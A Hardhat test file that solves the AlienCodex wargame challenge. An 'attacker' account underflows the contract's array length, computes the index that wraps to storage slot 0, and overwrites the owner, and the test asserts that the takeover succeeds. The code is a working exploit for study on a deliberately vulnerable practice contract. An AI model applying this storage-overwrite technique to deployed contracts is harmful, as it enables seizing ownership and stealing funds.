import { expect } from "chai";
import { ethers } from "hardhat";

describe("AlienCodex", async function () {

  it("Should complete the function with no error", async function () {
    const [signer, attacker] = await ethers.getSigners()
    const AlienCodex = await ethers.getContractFactory("AlienCodex");
    const alienCodex = await AlienCodex.deploy();
    await alienCodex.deployed();

    await alienCodex.connect(attacker).make_contact();
    await alienCodex.connect(attacker).retract();
    let hash = ethers.BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001"))
    hash = ethers.BigNumber.from("0x10000000000000000000000000000000000000000000000000000000000000000").sub(hash)
    //console.log(hash.toHexString())
    await alienCodex.connect(attacker).revise(hash, ethers.utils.hexZeroPad(attacker.address, 32))
    const storage0 = await ethers.provider.getStorageAt(alienCodex.address, 0)
    expect(await alienCodex.owner()).to.eq(attacker.address)
  });
});

